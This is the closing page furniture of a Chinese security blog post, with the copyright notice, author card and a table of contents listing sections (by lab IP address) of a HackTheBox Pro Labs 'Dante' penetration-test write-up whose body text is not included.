+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://cr4eper.github.io">cr4eper</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://cr4eper.github.io/2025/03/11/HTB%20Pro_Labs%20Dante%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">https://cr4eper.github.io/2025/03/11/HTB%20Pro_Labs%20Dante%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cr4eper.github.io" target="_blank">cr4eper's Home</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/wallhaven-3l17mv.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/10/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java反序列化"><img class="cover" src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/wallhaven-3l17mv.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Java反序列化</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241005141428.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">cr4eper</div><div class="author-info__description">一个正在学安全的小白</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cr4eper"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Pro-Labs-Dante%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">HTB Pro_Labs Dante打靶记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E9%83%A8%E5%88%86"><span class="toc-number">1.1.</span> <span class="toc-text">外网部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="toc-number">1.2.</span> <span class="toc-text">后渗透阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-10"><span class="toc-number">1.2.1.</span> <span class="toc-text">172.16.1.10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-12"><span class="toc-number">1.2.2.</span> <span class="toc-text">172.16.1.12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-13"><span class="toc-number">1.2.3.</span> <span class="toc-text">172.16.1.13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-20"><span class="toc-number">1.2.4.</span> <span class="toc-text">172.16.1.20</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#172-16-2-5"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">172.16.2.5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#172-16-2-101"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">172.16.2.101</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#172-16-2-6"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">172.16.2.6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-17"><span class="toc-number">1.2.5.</span> <span class="toc-text">172.16.1.17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-19"><span class="toc-number">1.2.6.</span> <span class="toc-text">172.16.1.19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-5"><span class="toc-number">1.2.7.</span> <span class="toc-text">172.16.1.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-1"><span class="toc-number">1.2.8.</span> <span class="toc-text">172.16.1.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-101"><span class="toc-number">1.2.9.</span> <span class="toc-text">172.16.1.101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#172-16-1-102"><span class="toc-number">1.2.10.</span> <span class="toc-text">172.16.1.102</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">1.3.</span> <span class="toc-text">结语</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">参考连接</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2025 By cr4eper</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
